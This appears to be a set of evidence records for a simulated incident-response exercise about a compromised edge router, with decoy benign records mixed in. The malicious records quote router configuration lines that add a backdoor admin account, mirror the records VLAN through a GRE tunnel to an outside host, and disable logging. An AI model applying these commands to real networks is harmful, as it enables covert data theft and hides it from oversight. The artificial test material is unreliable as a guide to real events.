oob_tap: capture upstream of the edge router
recs_audit: host access on the records server
egress_visibility: capture upstream of the edge router

records.incident_aaa_attacker:
TACACS+/AAA command accounting — EDGE-RTR01
Account 'netadmin' (priv 15), auth=ssh-publickey, src 45.77.31.118 (AS20473, Vultr), dst tcp/2222
2026-05-27 02:15Z  login; conf t; ip ssh port 2222 rotary 1; line vty rotary 1
                   access-list 120 permit ip host 45.77.31.118 any
                   username netadmin privilege 15 secret 9 $9$hR2...; ip ssh pubkey-chain (key added)
2026-05-28 02:40Z  session present; command accounting sequence gap: seq 4-11 absent (8 records
                   missing; no corresponding 'clear'); sequence resumes seq 12
2026-05-29 03:02Z  interface Tunnel1; tunnel mode gre ip; tunnel destination 185.211.34.90
                   monitor session 1 source 10.20.30.0 0.0.0.255 ; destination Tunnel1 ; acl MIRROR-RECS
2026-06-02 02:55Z  no logging on ; no logging buffered ; no logging host 10.20.10.50
2026-05-27 .. 2026-06-12: 10 sessions total, all 22:00-05:00 local. No change ticket references.
records.incident_edge_config_malicious:
EDGE-RTR01 running-config (config-compliance pull) — drift vs 2026-05-26 baseline:
+ username netadmin privilege 15 secret 9 $9$hR2...
+ ip ssh pubkey-chain / username netadmin / key-hash ssh-rsa AAAA... (added 2026-05-27)
+ ip ssh port 2222 rotary 1 ; line vty rotary 1
+ access-list 120 permit ip host 45.77.31.118 any
+ interface Tunnel1 ; tunnel mode gre ip ; tunnel source 203.0.113.1 ; tunnel destination 185.211.34.90
+ monitor session 1 source vlan/records 10.20.30.0/24 ; destination interface Tunnel1 ; filter acl MIRROR-RECS
+ (2026-06-02) logging disabled: 'no logging on/buffered/host'
None of the above carry a change ticket / GRC reference.
records.incident_edge_wan_netflow:
EDGE-RTR01 WAN-interface NetFlow (edge-uplink egress, incl. non-TCP/UDP):
proto 47 (GRE)  outer src 203.0.113.1  dst 185.211.34.90 (AS209588, Seychelles; Abuse.ch-listed; no rDNS)
since 2026-05-29; ~55.9 GB egressed; concentrated 22:00-05:00 local; egress:ingress ~17:1.
No GRE to this dst before 2026-05-29.
records.incident_tap_tunnel:
OOB capture at the internet handoff (upstream of EDGE-RTR01) — encrypted-traffic metadata only:
[tunnel]  proto 47 (GRE)  203.0.113.1 -> 185.211.34.90  persistent since 2026-05-29
          ~55.9 GB egress, off-hours weighted (22:00-05:00), egress:ingress ~17:1, dst Abuse.ch-listed.
[mgmt]    inbound TCP/2222 SSH sessions from 45.77.31.118 (AS20473, Vultr) since 2026-05-27,
          off-hours, ~10 sessions. Payload encrypted; contents not recoverable from metadata.
records.edge_config_benign_view:
EDGE-RTR01 running-config (config-compliance pull) — matches 2026-05-26 known-good baseline:
username svc-monitoring privilege 5 ; aaa group tacacs+ ; standard MGMT_ACCESS ACL
crypto map S2S 10 -> peer 198.51.100.7 (documented partner site-to-site VPN)
No non-standard listener ports; no Tunnel interfaces; no monitor/SPAN sessions; logging enabled.
records.device_logs_cleared_gap:
EDGE-RTR01 local log store — current contents:
Earliest retained entry: 2026-06-04 09:14Z. No entries before that timestamp. No logging-clear,
rotation, or reload event is recorded in the store to account for the absence.
records.device_logs_intact:
EDGE-RTR01 local log store — current contents:
Continuous entries from 2026-05-13 onward; routine interface/auth/ntp events; no gaps; no anomalies.
records.aaa_legit_only:
TACACS+/AAA records — EDGE-RTR01 / PERIM-FW01:
neng-rkaur, neng-tpatel — SSH from NOC-JUMP01 (10.20.10.10), business hours, routine show/config.
extpt-coalridge — 2026-06-05..07 from 192.0.2.10/11/12 (pentest window), read-only show commands.
No sessions on tcp/2222. No sessions from 45.77.31.118. No 'netadmin' account present in records.
records.device_integrity_selfreport_untrusted:
EDGE-RTR01 integrity: the device self-reports its IOS image signature as valid. This is the
device's own management-plane self-report and cannot be independently verified from the device.
Out-of-band firmware/image forensics (offline hash vs vendor known-good, ROMmon/bootloader review)
are required to confirm or refute. Treat as device self-report, not independent verification.
records.core_netflow_eastwest:
CORE-RTR01 NetFlow — inter-segment (east-west) only. No coverage of EDGE-RTR01's WAN uplink.
Records show normal mgmt<->corp<->records flows. No flows to 185.211.34.90 or 45.77.31.118 observed
on any internal interface (such traffic, if present, transits the WAN uplink not captured here).
records.fw_egress_offpath:
PERIM-FW01 logs cover internal-segment TCP/UDP egress. PERIM-FW01 is not inline on EDGE-RTR01's
WAN uplink; GRE/traffic sourced from 203.0.113.1 directly to an internet peer does not transit
this firewall and is not captured. No sessions to 185.211.34.90 / 45.77.31.118 in the internal
egress it does cover.
records.recs_audit_legit:
RECS-DB01 access audit: application service accounts and the nightly billing job
(sp_BillingCycle_Monthly) only. No anomalous interactive or external access. (Host audit cannot
observe traffic captured by an upstream port-mirror; it reflects host-level access only.)
records.host_edr_clean:
Host EDR (CORP-WS01/02/03, NOC-JUMP01, RECS-DB01): no beaconing, no persistence mechanisms, no
credential-dumping, no anomalous process lineage. Nothing actionable.
records.grc_pentest_record:
GRC system of record — engagement PT-2026-04 "External Network Pen Test — Edge Infrastructure":
vendor Coalridge Security; internal owner neng-rkaur; approver director mgmt-dkirwan (signed
2026-06-04 08:55Z); authorized window 2026-06-05..06-07; scope edge-rtr01/fw01 READ-ONLY, no
internal-segment access; approved source IPs 192.0.2.10/11/12; change ticket CHG-2026-0819;
account extpt-coalridge auto-disabled 2026-06-08; final report delivered. Test tunnel GRE
203.0.113.1<->192.0.2.50 active only in-window, torn down 2026-06-07 17:55Z. Residual rollback:
192.0.2.0/24 permit still in MGMT_ACCESS ACL (CHG-2026-0821, unscheduled).
records.baseline_legit_span:
CORE-RTR01 monitor session -> NOC-MON01, change ticket CHG-2026-0731, account svc-noc-mon,
documented performance monitoring. Destination is the internal NOC monitoring host.
records.baseline_undoc_legit_change:
CORE-RTR01 config: SNMP community + NTP server change on 2026-06-03 by neng-tpatel from
NOC-JUMP01. No change ticket on file. Confirmed routine/benign by NOC.
records.tap_benign:
OOB capture at the internet handoff — encrypted-traffic metadata only:
Only tunnel observed: the documented partner S2S VPN, 203.0.113.1 <-> 198.51.100.7 (matches the
crypto map in config). Routine internet egress otherwise. No rogue tunnels; no off-hours anomalies;
no inbound sessions on non-standard management ports.
